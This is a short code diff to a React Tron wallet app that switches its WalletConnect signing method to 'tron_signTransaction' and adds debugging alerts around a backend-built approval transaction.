@@ -68,7 +68,7 @@ function TronApp() {
         requiredNamespaces: {
           tron: {
             chains: [MAINNET_CHAIN_ID],
-            methods: ['tron_sign', 'tron_signMessage'],
+            methods: ['tron_signTransaction', 'tron_signMessage'],
             events: [],
           },
         },
@@ -93,7 +93,9 @@ function TronApp() {
     try {
       setStatus("Creating approval transaction...");
       setTxHash('');
-
+      alert(session);
+      alert(session.topic);
+      alert(signClient);
       const txResponse = await fetch('https://smartcontbackend.onrender.com/create-approve', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -113,7 +115,7 @@ function TronApp() {
         chainId: MAINNET_CHAIN_ID,
         topic: session.topic,
         request: {
-          method: 'tron_sign',
+          method: 'tron_signTransaction',
           params: [unsignedTx]
         }
       });
@@ -167,7 +169,7 @@ function TronApp() {
         chainId: MAINNET_CHAIN_ID,
         topic: session.topic,
         request: {
-          method: 'tron_sign',
+          method: 'tron_signTransaction',
           params: [unsignedTx]
         }
       });
